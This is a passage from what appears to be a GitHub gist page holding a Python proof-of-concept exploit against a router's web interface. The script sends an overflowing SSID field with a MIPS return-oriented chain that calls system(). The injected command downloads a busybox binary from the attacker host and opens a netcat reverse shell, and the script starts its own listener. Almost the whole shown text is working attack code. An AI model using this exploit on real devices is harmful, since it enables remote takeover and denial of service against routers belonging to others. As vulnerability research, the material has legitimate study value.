    <span class="pl-s">'User-Agent'</span>: <span class="pl-s">'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'</span>,
    <span class="pl-s">'Accept'</span>: <span class="pl-s">'*/*'</span>,
    <span class="pl-s">'Accept-Language'</span>: <span class="pl-s">'en-US,en;q=0.5'</span>,
    <span class="pl-s">'Accept-Encoding'</span>: <span class="pl-s">'gzip, deflate'</span>,
    <span class="pl-s">'Content-Type'</span>: <span class="pl-s">'application/x-www-form-urlencoded; charset=UTF-8'</span>,
    <span class="pl-s">'X-Requested-With'</span>: <span class="pl-s">'XMLHttpRequest'</span>,
    <span class="pl-s">'Origin'</span>: <span class="pl-s">'http://192.168.0.1'</span>,
    <span class="pl-s">'Connection'</span>: <span class="pl-s">'close'</span>,
    <span class="pl-s">'Referer'</span>: <span class="pl-s">'http://192.168.0.1/wlsecurity.htm'</span>
    }

    <span class="pl-s1">data</span> <span class="pl-c1">=</span> {
        <span class="pl-s">'sessionCheck'</span>: <span class="pl-s">'d5c0e890940bdb1c5621c888994a23e6'</span>,
        <span class="pl-s">'submit-url'</span>: <span class="pl-s">'%2Fwlsecurity.htm'</span>,
        <span class="pl-s">'opmode_wizard'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'staControlPrefer'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'staControlEnabled'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'80211v_enable_'</span>: <span class="pl-s">'disable'</span>,
        <span class="pl-s">'dot11k_'</span>: <span class="pl-s">'disable'</span>,
        <span class="pl-s">'SSID_Setting5'</span>: <span class="pl-s">'1'</span>,
        <span class="pl-s">'has_vwlan5'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'wpaAuth5'</span>: <span class="pl-s">'psk'</span>,
        <span class="pl-s">'wpa11w5'</span>: <span class="pl-s">'none'</span>,
        <span class="pl-s">'wpa2EnableSHA2565'</span>: <span class="pl-s">'disable'</span>,
        <span class="pl-s">'ciphersuite5'</span>: <span class="pl-s">'aes'</span>,
        <span class="pl-s">'wpa2ciphersuite5'</span>: <span class="pl-s">'aes'</span>,
        <span class="pl-s">'wps_clear_configure_by_reg5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'wlan_disabled5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'wlan_ssid5'</span>: <span class="pl-s">b'a'</span><span class="pl-c1">*</span><span class="pl-c1">0x44</span><span class="pl-c1">+</span><span class="pl-s">b'deadbeef'</span>,
        <span class="pl-s">'method5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'wlcontroltime5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'stanums5'</span>: <span class="pl-s">'32'</span>,
        <span class="pl-s">'authType5'</span>: <span class="pl-s">'auto'</span>,
        <span class="pl-s">'wepKeyLen5'</span>: <span class="pl-s">'wep64'</span>,
        <span class="pl-s">'wepEnabled5'</span>: <span class="pl-s">'ON'</span>,
        <span class="pl-s">'length5'</span>: <span class="pl-s">'1'</span>,
        <span class="pl-s">'format5'</span>: <span class="pl-s">'2'</span>,
        <span class="pl-s">'key5'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'pskFormat5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'pskValue5'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'preAuth5'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'radiusIP5'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'radiusPort5'</span>: <span class="pl-s">'1812'</span>,
        <span class="pl-s">'radiusPass5'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'use1x5'</span>: <span class="pl-s">'OFF'</span>,
        <span class="pl-s">'eapType5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'eapInsideType5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'eapUserId5'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'radiusUserName5'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'radiusUserPass5'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'radiusUserCertPass5'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'wl_access5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'tx_restrict5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'rx_restrict5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'hiddenSSID5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'sync_password5'</span>: <span class="pl-s">'1'</span>,
        <span class="pl-s">'save_apply'</span>: <span class="pl-s">'1'</span>
    }

    <span class="pl-s1">requests</span>.<span class="pl-c1">post</span>(<span class="pl-s">'http://192.168.0.1/boafrm/formWlEncrypt'</span>, <span class="pl-s1">headers</span><span class="pl-c1">=</span><span class="pl-s1">headers</span>, <span class="pl-s1">data</span><span class="pl-c1">=</span><span class="pl-s1">data</span>)



<span class="pl-k">def</span> <span class="pl-en">attack</span>(<span class="pl-s1">io</span>):
    <span class="pl-s1">logging</span>.<span class="pl-c1">info</span>(<span class="pl-s">"Please ensure that your device and your host are on the same local network, with the IP address of the target device being 192.168.0.1 and the host IP address being 192.168.0.2. Such IP assignments are common in devices simulated by FirmAE."</span>)
    <span class="pl-s1">logging</span>.<span class="pl-c1">info</span>(<span class="pl-s">"<span class="pl-cce">\n</span>"</span>)
    <span class="pl-s1">logging</span>.<span class="pl-c1">info</span>(<span class="pl-s">"To successfully execute the reverse shell payload, ensure that the busybox-mipsel binary and the Python script are located in the same directory so that the targeted machine can\successfully download the file from the host."</span>)
    <span class="pl-s1">logging</span>.<span class="pl-c1">info</span>(<span class="pl-s">"<span class="pl-cce">\n</span>"</span>)
    <span class="pl-s1">logging</span>.<span class="pl-c1">warn</span>(<span class="pl-s">"On this virtual device, the loading base address of ulibc is 0x77d0b000. If you are using FirmAE mode for verification, please disable ASLR and use gdb + pwndbg's vmmap or other methods to determine the base address of ulibc. If you cannot determine the runtime base address of ulibc, this attack payload will cause the device service to go offline, resulting in a denial of service attack."</span>)
    <span class="pl-s1">server_process</span> <span class="pl-c1">=</span> <span class="pl-s1">subprocess</span>.<span class="pl-c1">Popen</span>([<span class="pl-s">'python'</span>, <span class="pl-s">'-m'</span>, <span class="pl-s">'http.server'</span>])
    <span class="pl-c">#On this virtual device, the base address of ulibc is 0x77d0b000. </span>
    <span class="pl-c">#If you are using FirmAE mode for verification, please disable ASLR </span>
    <span class="pl-c">#and determine the base value of ulibc using gdb + pwndbg's vmmap or other methods.</span>

    <span class="pl-s1">libc_base</span> <span class="pl-c1">=</span> <span class="pl-c1">0x77d0b000</span> 
    <span class="pl-c">#To successfully execute the reverse shell payload, ensure that the busybox-mipsel</span>
    <span class="pl-c"># binary and the Python script are located in the same directory so that the targeted </span>
    <span class="pl-c">#machine can successfully download the file from the host.</span>
    <span class="pl-c">#Please ensure that your device and your host are on the same local network, with the </span>
    <span class="pl-c">#IP address of the target device being 192.168.0.1 and the host IP address </span>
    <span class="pl-c">#being 192.168.0.2. Such IP assignments are common in devices simulated by FirmAE.</span>
    <span class="pl-s1">cmd</span> <span class="pl-c1">=</span> <span class="pl-s">b' sleep 5;wget http://192.168.0.2:8000/busybox-mipsel;chmod 777 ./busybox-mipsel;./busybox-mipsel nc 192.168.0.2 2333  -e /bin/sh;<span class="pl-cce">\00</span>'</span>
    
    <span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s">b'POST /boafrm/formWlEncrypt HTTP/1.1<span class="pl-cce">\t</span><span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'Host: 192.168.0.1<span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0<span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'Accept: */*<span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'Accept-Language: en-US,en;q=0.5<span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'Accept-Encoding: gzip, deflate<span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'Content-Type: application/x-www-form-urlencoded; charset=UTF-8<span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'X-Requested-With: XMLHttpRequest<span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'Content-Length: 1300<span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'Origin: http://192.168.0.1<span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'Connection: close<span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'Referer: http://192.168.0.1/wlsecurity.htm<span class="pl-cce">\r</span><span class="pl-cce">\n</span><span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>

    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'sessionCheck=aa5edb8ba4aae591d9dd6af412bb8a22<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;submit-url=%2Fwlsecurity.htm<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;opmode_wizard=&amp;staControlPrefer=0<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;staControlEnabled=0<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;80211v_enable_=disable<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;dot11k_=disable<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;SSID_Setting5=1<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;has_vwlan5=<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;wpaAuth5=psk<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;wpa11w5=none<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;wpa2EnableSHA2565=disable<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;ciphersuite5=aes<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;wpa2ciphersuite5=aes<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;wps_clear_configure_by_reg5=0<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;wlan_disabled5=0<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;wlan_ssid5='</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">0xdeadbeef</span>) <span class="pl-c">#s2</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">libc_base</span><span class="pl-c1">+</span><span class="pl-c1">0x00033448</span>) <span class="pl-c">#s1 system addr</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">0xbeffdead</span>) <span class="pl-c">#s0</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">libc_base</span><span class="pl-c1">+</span><span class="pl-c1">0x000378D4</span>) <span class="pl-c">#ra addiu   $v1, $sp, 0x120 ---&gt; jalr    $t9 </span>
    <span class="pl-s">''' addiu   $v1, $sp, 0x120</span>
<span class="pl-s">    LOAD:000378D8                 move    $a0, $v1</span>
<span class="pl-s">    LOAD:000378DC                 move    $t9, $s1</span>
<span class="pl-s">    LOAD:000378E0                 sw      $v1, 0x1AC($sp)</span>
<span class="pl-s">    LOAD:000378E4                 move    $a1, $zero</span>
<span class="pl-s">    LOAD:000378E8                 jalr    $t9 ; memset'''</span>

    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'b'</span><span class="pl-c1">*</span>(<span class="pl-c1">0x120</span>)
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s1">cmd</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'&amp;method5=0&amp;wlcontroltime5=0&amp;stanums5=32&amp;authType5=auto&amp;wepKeyLen5=wep64&amp;wepEnabled5=ON&amp;length5=1&amp;format5=2&amp;key5=&amp;pskFormat5=0&amp;pskValue5=&amp;preAuth5=&amp;radiusIP5=&amp;radiusPort5=1812&amp;radiusPass5=&amp;use1x5=OFF&amp;eapType5=0&amp;eapInsideType5=0&amp;eapUserId5=&amp;radiusUserName5=&amp;radiusUserPass5=&amp;radiusUserCertPass5=&amp;wl_access5=0&amp;tx_restrict5=0&amp;rx_restrict5=0&amp;hiddenSSID5=0&amp;sync_password5=1&amp;save_apply=1'</span>
    <span class="pl-s1">io</span>.<span class="pl-c1">send</span>(<span class="pl-s1">payload</span>)
    <span class="pl-s1">io</span>.<span class="pl-c1">close</span>()

    <span class="pl-s1">result</span> <span class="pl-c1">=</span> <span class="pl-s1">subprocess</span>.<span class="pl-c1">run</span>(<span class="pl-s">f'nc -lvnp 2333'</span>, <span class="pl-s1">shell</span><span class="pl-c1">=</span><span class="pl-c1">True</span>)

    <span class="pl-k">if</span> <span class="pl-s1">result</span>.<span class="pl-c1">returncode</span> <span class="pl-c1">==</span> <span class="pl-c1">0</span>:
        <span class="pl-s1">logging</span>.<span class="pl-c1">info</span>(<span class="pl-s">"Done"</span>)
    <span class="pl-k">else</span>:
        <span class="pl-s1">logging</span>.<span class="pl-c1">error</span>(<span class="pl-s">"Command execution failed."</span>)

    <span class="pl-s1">server_process</span>.<span class="pl-c1">terminate</span>()

<span class="pl-k">def</span> <span class="pl-en">main</span>():

    <span class="pl-s1">io</span> <span class="pl-c1">=</span> <span class="pl-en">remote</span>(<span class="pl-s">'192.168.0.1'</span>,<span class="pl-c1">80</span>)
    
    <span class="pl-en">invokeFormLogin</span>()
    <span class="pl-en">invokeformMultiAP</span>()<span class="pl-c">#After auditing the code, it was found that this function call is not necessary, but it still works without any impact on the result.</span>
    <span class="pl-en">attack</span>(<span class="pl-s1">io</span>)

<span class="pl-k">if</span> <span class="pl-s1">__name__</span> <span class="pl-c1">==</span> <span class="pl-s">'__main__'</span>:
    <span class="pl-en">main</span>()</pre></div>
</article>
  </div>

  </div>
</div>


        <a name="comments"></a>
        <div class="js-quote-selection-container" data-quote-markdown=".js-comment-body">
          <div class="js-discussion "
          >
            <div class="ml-md-6 pl-md-3 ml-0 pl-0">
              



<!-- Rendered timeline since 2024-08-04 01:11:27 -->
<div id="partial-timeline-marker"
      class="js-timeline-marker js-updatable-content"
      data-last-modified="Sun, 04 Aug 2024 08:11:27 GMT"
      >
</div>

            </div>

            <div class="discussion-timeline-actions">
              <div data-view-component="true" class="flash flash-warn mt-3">
  
    <a rel="nofollow" class="btn btn-primary" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;signed out comment&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="e4ac6ac444cfb4e7c04994b0af4edf3f42e0f2bad42d41a979c7030d89e0669d" href="/join?source=comment-gist">Sign up for free</a>
    <strong>to join this conversation on GitHub</strong>.
    Already have an account?
    <a rel="nofollow" class="Link--inTextBlock" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;signed out comment&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="98f224501aee17aa49c807f375c595f19d8013fb25b9196e672d16c0a2aef32f" data-test-selector="comments-sign-in-link" href="/login?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2Fee095fbfe13f77a5b45b39a5aa82bd17">Sign in to comment</a>


  
</div>
            </div>
          </div>
        </div>
</div>
  </div>
</div><!-- /.container -->

    </main>
  </div>

  </div>

          <footer class="footer pt-8 pb-6 f6 color-fg-muted p-responsive" role="contentinfo" >
  <h2 class='sr-only'>Footer</h2>

  


  <div class="d-flex flex-justify-center flex-items-center flex-column-reverse flex-lg-row flex-wrap flex-lg-nowrap">
    <div class="d-flex flex-items-center flex-shrink-0 mx-2">
      <a aria-label="Homepage" title="GitHub" class="footer-octicon mr-2" href="https://github.com">
        <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-mark-github">
    <path d="M12.5.75C6.146.75 1 5.896 1 12.25c0 5.089 3.292 9.387 7.863 10.91.575.101.79-.244.79-.546 0-.273-.014-1.178-.014-2.142-2.889.532-3.636-.704-3.866-1.35-.13-.331-.69-1.352-1.18-1.625-.402-.216-.977-.748-.014-.762.906-.014 1.553.834 1.769 1.179 1.035 1.74 2.688 1.25 3.349.948.1-.747.402-1.25.733-1.538-2.559-.287-5.232-1.279-5.232-5.678 0-1.25.445-2.285 1.178-3.09-.115-.288-.517-1.467.115-3.048 0 0 .963-.302 3.163 1.179.92-.259 1.897-.388 2.875-.388.977 0 1.955.13 2.875.388 2.2-1.495 3.162-1.179 3.162-1.179.633 1.581.23 2.76.115 3.048.733.805 1.179 1.825 1.179 3.09 0 4.413-2.688 5.39-5.247 5.678.417.36.776 1.05.776 2.128 0 1.538-.014 2.774-.014 3.162 0 .302.216.662.79.547C20.709 21.637 24 17.324 24 12.25 24 5.896 18.854.75 12.5.75Z"></path>
</svg>
</a>
      <span>
        &copy; 2025 GitHub,&nbsp;Inc.
      </span>
    </div>

    <nav aria-label="Footer">
      <h3 class="sr-only" id="sr-footer-heading">Footer navigation</h3>

      <ul class="list-style-none d-flex flex-justify-center flex-wrap mb-2 mb-lg-0" aria-labelledby="sr-footer-heading">

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to Terms&quot;,&quot;label&quot;:&quot;text:terms&quot;}" href="https://docs.github.com/site-policy/github-terms/github-terms-of-service" data-view-component="true" class="Link--secondary Link">Terms</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to privacy&quot;,&quot;label&quot;:&quot;text:privacy&quot;}" href="https://docs.github.com/site-policy/privacy-policies/github-privacy-statement" data-view-component="true" class="Link--secondary Link">Privacy</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to security&quot;,&quot;label&quot;:&quot;text:security&quot;}" href="https://github.com/security" data-view-component="true" class="Link--secondary Link">Security</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to status&quot;,&quot;label&quot;:&quot;text:status&quot;}" href="https://www.githubstatus.com/" data-view-component="true" class="Link--secondary Link">Status</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to docs&quot;,&quot;label&quot;:&quot;text:docs&quot;}" href="https://docs.github.com/" data-view-component="true" class="Link--secondary Link">Docs</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to contact&quot;,&quot;label&quot;:&quot;text:contact&quot;}" href="https://support.github.com?tags=dotcom-footer" data-view-component="true" class="Link--secondary Link">Contact</a>
          </li>

          <li class="mx-2" >
  <cookie-consent-link>
    <button
      type="button"
      class="Link--secondary underline-on-hover border-0 p-0 color-bg-transparent"
      data-action="click:cookie-consent-link#showConsentManagement"
      data-analytics-event="{&quot;location&quot;:&quot;footer&quot;,&quot;action&quot;:&quot;cookies&quot;,&quot;context&quot;:&quot;subfooter&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;cookies_link_subfooter_footer&quot;}"
    >
      Manage cookies
    </button>
  </cookie-consent-link>
</li>

<li class="mx-2">
  <cookie-consent-link>
    <button
      type="button"
      class="Link--secondary underline-on-hover border-0 p-0 color-bg-transparent"
      data-action="click:cookie-consent-link#showConsentManagement"
      data-analytics-event="{&quot;location&quot;:&quot;footer&quot;,&quot;action&quot;:&quot;dont_share_info&quot;,&quot;context&quot;:&quot;subfooter&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;dont_share_info_link_subfooter_footer&quot;}"
    >
      Do not share my personal information
    </button>
  </cookie-consent-link>
</li>

      </ul>
    </nav>
  </div>
</footer>




    <ghcc-consent id="ghcc" class="position-fixed bottom-0 left-0" style="z-index: 999999" data-initial-cookie-consent-allowed="" data-cookie-consent-required="true"></ghcc-consent>


  <div id="ajax-error-message" class="ajax-error-message flash flash-error" hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
    </button>
    You can’t perform that action at this time.
  </div>

    <template id="site-details-dialog">
  <details class="details-reset details-overlay details-overlay-dark lh-default color-fg-default hx_rsm" open>
    <summary role="button" aria-label="Close dialog"></summary>
    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast hx_rsm-dialog hx_rsm-modal">
      <button class="Box-btn-octicon m-0 btn-octicon position-absolute right-0 top-0" type="button" aria-label="Close dialog" data-close-dialog>
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
      </button>
      <div class="octocat-spinner my-6 js-details-dialog-spinner"></div>
    </details-dialog>
  </details>
</template>

    <div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;">
  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box color-shadow-large" style="width:360px;">
  </div>
</div>

    <template id="snippet-clipboard-copy-button">
  <div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0" data-copy-feedback="Copied!" data-tooltip-direction="w">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none m-2">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
    </clipboard-copy>
  </div>
</template>
<template id="snippet-clipboard-copy-button-unpositioned">
  <div class="zeroclipboard-container">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
    </clipboard-copy>
  </div>
</template>




    </div>

    <div id="js-global-screen-reader-notice" class="sr-only mt-n1" aria-live="polite" aria-atomic="true" ></div>
    <div id="js-global-screen-reader-notice-assertive" class="sr-only mt-n1" aria-live="assertive" aria-atomic="true"></div>
  </body>
</html>

